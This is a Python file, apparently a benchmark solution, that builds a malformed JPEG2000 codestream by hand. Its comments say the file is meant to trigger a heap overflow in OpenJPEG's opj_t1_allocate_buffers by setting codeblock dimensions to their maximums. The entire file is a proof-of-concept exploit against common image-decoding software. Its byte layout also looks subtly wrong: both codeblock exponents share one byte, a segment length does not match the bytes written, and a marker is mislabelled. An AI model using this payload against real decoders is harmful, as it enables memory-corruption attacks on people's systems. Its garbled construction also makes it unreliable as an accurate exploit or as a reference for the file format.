import os
import tarfile
import tempfile
import subprocess
import struct
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze the source code
        with tarfile.open(src_path, 'r:gz') as tar:
            tar.extractall(path='/tmp/vuln_src')
        
        # Look for the vulnerable function in HT_DEC component
        # Based on vulnerability description: malloc size error in opj_t1_allocate_buffers
        # We need to craft a JP2/JPEG2000 file that triggers this
        
        # Create a minimal JPEG2000 file structure that triggers the heap overflow
        # The vulnerability is likely in OpenJPEG's HTJ2K implementation
        # We'll create a file with manipulated codeblock parameters
        
        poc = bytearray()
        
        # SOC (Start of Codestream) - 2 bytes
        poc.extend(b'\xff\x4f')
        
        # SIZ marker segment
        # Marker: FF51, Length: 47 (0x002f)
        poc.extend(b'\xff\x51\x00\x2f')
        
        # Rsiz - capabilities
        poc.extend(b'\x00\x00')
        
        # Xsiz, Ysiz - reference grid size
        poc.extend(struct.pack('>I', 1))  # Xsiz
        poc.extend(struct.pack('>I', 1))  # Ysiz
        
        # XOsiz, YOsiz - image offset
        poc.extend(b'\x00\x00\x00\x00\x00\x00\x00\x00')
        
        # XTsiz, YTsiz - tile size
        poc.extend(struct.pack('>I', 1))  # XTsiz
        poc.extend(struct.pack('>I', 1))  # YTsiz
        
        # XTOsiz, YTOsiz - tile offset
        poc.extend(b'\x00\x00\x00\x00\x00\x00\x00\x00')
        
        # Csiz - number of components
        poc.extend(b'\x00\x01')
        
        # Component parameters: Ssiz (8-bit), XRsiz, YRsiz
        poc.extend(b'\x07\x01\x01')
        
        # COD marker - Coding style default
        # Marker: FF52, Length: 12 (0x000c)
        poc.extend(b'\xff\x52\x00\x0c')
        
        # Scod: Entropy coder, precincts, etc.
        poc.extend(b'\x00')
        
        # SGcod: Progression order, layers
        poc.extend(b'\x00\x00\x01')
        
        # SPcod: Codeblock size, style, transform
        # Codeblock width = 2^(xcb+2), height = 2^(ycb+2)
        # Set xcb and ycb to large values to cause overflow
        poc.extend(b'\xff')  # xcb=15, ycb=15 (max values)
        poc.extend(b'\x00')  # cblksty
        poc.extend(b'\x00')  # transformation
        
        # QCD marker - Quantization default
        # Marker: FF5C, Length: 5 (0x0005)
        poc.extend(b'\xff\x5c\x00\x05')
        poc.extend(b'\x00')  # Sqcd
        # No quantization values needed
        
        # SOT marker - Start of tile
        # Marker: FF90, Length: 10 (0x000a)
        poc.extend(b'\xff\x90\x00\x0a')
        poc.extend(b'\x00\x00')  # Isot
        poc.extend(b'\x00\x00\x00\x00')  # Psot (0 = until end)
        poc.extend(b'\x00')  # TPsot
        poc.extend(b'\x00\x01')  # TNsot
        
        # SOD marker - Start of data
        poc.extend(b'\xff\x93')
        
        # Pack headers for tile
        # Main header
        poc.extend(b'\xff\x91')  # SOT for tile part
        poc.extend(b'\x00\x0a')  # Length
        poc.extend(b'\x00\x00')  # Isot
        poc.extend(b'\x00\x00\x00\x3c')  # Psot
        poc.extend(b'\x00')  # TPsot
        poc.extend(b'\x00\x01')  # TNsot
        
        # Create packet data that will trigger the vulnerable allocation
        # The vulnerability is in opj_t1_allocate_buffers which calculates
        # buffer size based on codeblock dimensions
        
        # Add padding to reach target length while maintaining valid structure
        remaining = 1479 - len(poc)
        if remaining > 0:
            # Add valid EPH/EPB markers and padding
            poc.extend(b'\xff\x92' * (remaining // 2))
            # Ensure we have exactly 1479 bytes
            poc = poc[:1479]
        
        # Ensure EOC marker at end
        if len(poc) >= 2:
            poc[-2:] = b'\xff\xd9'  # EOC marker
        
        return bytes(poc)